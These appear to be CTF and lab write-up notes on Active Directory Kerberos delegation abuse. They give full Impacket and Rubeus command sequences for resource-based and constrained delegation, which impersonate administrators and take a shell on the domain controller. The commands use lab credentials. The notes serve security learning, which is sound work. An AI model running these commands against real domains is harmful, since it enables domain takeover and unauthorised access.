# Example 1
I was doing a CTF when I stumbled upon a user(svc_apache) that held "GenericWrite" over a Computer Object(DC machine).
Now as the name describes we can write/change any attribute on the machne DC which allows us to perform the RBCD by adding the attribute ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity attribute.
**Reference**:https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity
### Requirement for the attack:
1)Credentials of the account that helds GenericWrite(apache_svc)
2)A SPN! 
**OBS**: all the guides on web implies to add a new FAKEPC so you can inject a SPN and it's the SPN the required part. In this attack adding a FAKEPC is also possible since the **msaddquota=10** by default but not necessary as svc_apache is a service account with a SPN associated(was kerberoastable because held a SPN).
### How I attacked:
1)Added the permission to delegate.
```
impacket-rbcd -action write -delegate-to "M3DC$" -delegate-from "svc_apache" m3c.local/svc_apache:ef8Mahvae2j2
```
2)Asked a TGS with impersonation on behalf of a user that can psexec on the DC
```
impacket-getST -spn 'cifs/m3dc.m3c.local' -impersonate john.clark -dc-ip 10.9.20.10 m3c.local/svc_apache:"ef8Mahvae2j2"
```
3)Imported the ccache kerberos ticket
```
export KRB5CCNAME=john.clark.ccache
```
4)Lastly, accessing the machine via PTT(Pass the ticket) 
**OBS**: here is important to use the FQDN of the machines and not the IP!
```
impacket-psexec -k -no-pass m3c.local/john.clark@m3dc.m3c.local
```
**EXTRA**: here this part made me swear cause I concentrated on only one user that couldn't perform the access and it failed miserably. 
So in future if you have several potential users(ex part of it admins group) then try several other before giving UP!


# Example 2
When you have **MachineAccountQuota=10**(aka can add machines to AD) but noPAC isn't working!
Taking inspiration from: https://medium.com/@Dpsypher/proving-grounds-practice-resourced-b3a50d40664b
1)Add a new dummy PC to AD
```
impacket-addcomputer freelancer.htb/lorra199:"PWN3D#l0rr@Armessa199" -dc-ip 10.10.11.5 -computer-name 'YOVECIO$' -computer-pass 'Coglione1!'
```
2)Next we need to add delegation(aka **msDS-AllowedToActOnBehalfOfOtherIdentity**) to the fake computer object
```
git clone https://github.com/tothi/rbcd-attack.git
python3 rbcd.py -dc-ip 10.10.11.5 -t "DC" -f "YOVECIO" freelancer.htb\\lorra199:"PWN3D#l0rr@Armessa199"
```
OR use the impacketer native
```
impacket-rbcd -delegate-from 'YOVECIO$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action write 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```
3)Next we can ask the Kerberos ticket and perform a impersonation!
```
impacket-getST -spn cifs/dc.freelancer.htb freelancer.htb/yovecio\$:'Coglione1!' -impersonate Administrator -dc-ip 10.10.11.5
```
4)Now we need to point to the kerberos ticket on our machine
```
export KRB5CCNAME=/PATH/TO/TICKET.CCACHE
klist
```
5)Now you can connect with the ticket via impacketer and enjoy!
```
sudo impacket-smbexec -k -no-pass dc.freelancer.htb -dc-ip 10.10.11.5 
```


# Example 3
Another scenario where a user have **AllowedToDelegate** permission over DC(username and password needed for the attack). 
1)We need first to ask for a TGT ticket on a Machine in AD (will save the kirbi ticket for convenience)
```
./Rubeus.exe asktgt /user:blake /password:Coglione1! /ptt /nowrap /outfile:blake_tgt
```
2)Next we need to check what a user can impersonate (EX: `msds-allowedtodelegateto: {CIFS/dc.painters.htb, CIFS/DC}`)
```
Get-NetUser -TrustedToAuth
```
3)Next you can perform a S4u attack(use the TGT, username and MSDC service from setp 2)
```
./Rubeus.exe s4u /ticket:blake_tgt /impersonateuser:administrator /domain:painters.htb /msdsspn:CIFS/dc.painters.htb /dc:dc.painters.htb /ptt /outfile:"admindc_ldap.kirbi"
```
OBS:
```
You can ask for other services as well, not only CIFS but then you need to use /altservice option
EX:  /altservice:LDAP
```
4)When read check that ticket is in session with klist command EX:
```
C:\Temp> klist
Current LogonId is 0:0x3e7
Cached Tickets: (1)
#0>     Client: administrator @ PAINTERS.HTB
        Server: LDAP/dc.painters.htb @ PAINTERS.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/11/2023 16:16:23 (local)
        End Time:   9/12/2023 2:10:46 (local)
        Renew Time: 9/18/2023 16:10:46 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```
